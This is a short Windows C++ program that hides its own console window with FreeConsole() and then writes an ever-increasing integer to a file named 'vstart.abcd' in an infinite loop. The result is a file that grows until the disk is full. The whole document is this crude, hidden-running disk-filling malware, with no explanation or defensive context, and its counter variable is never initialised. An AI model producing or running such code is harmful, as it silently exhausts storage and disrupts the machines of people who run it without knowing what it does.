#include<iostream>
#include<fstream>
#include<windows.h>
using namespace std;

int main() {
    FreeConsole();
    int i;
    ofstream vstart;
    vstart.open("vstart.abcd");
    while(1) {
        vstart<<i;
        i++;
    }
    vstart.close();
}
